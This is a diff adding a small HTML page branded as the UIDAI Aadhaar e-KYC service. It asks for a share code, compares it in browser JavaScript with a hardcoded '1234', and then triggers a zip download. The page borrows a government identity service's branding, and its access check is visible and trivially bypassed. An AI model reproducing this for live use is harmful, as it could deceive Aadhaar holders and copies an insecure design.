@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Offline eKYC - UIDAI</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header>
+    <img src="logo.svg" alt="UIDAI">
+    <span>UIDAI - Aadhaar e-KYC</span>
+</header>
+<div class="card">
+    <h2>Enter Share Code</h2>
+    <input type="password" id="shareCode" placeholder="Enter 4-digit code"><br>
+    <button onclick="submitCode()">Submit</button>
+</div>
+
+<script>
+function submitCode() {
+    let code = document.getElementById('shareCode').value;
+    if (code === '1234') {
+        window.location.href = 'offlineaadhaar20250805063808221.zip';
+    } else {
+        alert('Invalid Code!');
+    }
+}
+</script>
+</body>
+</html>
